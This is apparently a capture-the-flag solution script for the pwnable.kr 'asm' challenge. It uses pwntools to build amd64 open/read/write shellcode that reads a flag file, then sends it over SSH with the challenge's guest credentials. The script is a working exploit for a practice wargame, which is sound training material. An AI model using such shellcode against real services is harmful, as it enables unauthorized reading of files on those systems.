from pwn import *

context.update(arch='amd64')

file_name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
buf = ""
shellcode = asm(
        shellcraft.open(file_name)
    +   shellcraft.read('rax', 'rsp', 50)  
    +   shellcraft.write(1, 'rsp', 50)
    +   shellcraft.exit(0)
        )

s = ssh(user='asm', host='pwnable.kr', password='guest', port=2222)
p = s.remote('0', 9026)
p.sendline(shellcode)
print(p.recvall())
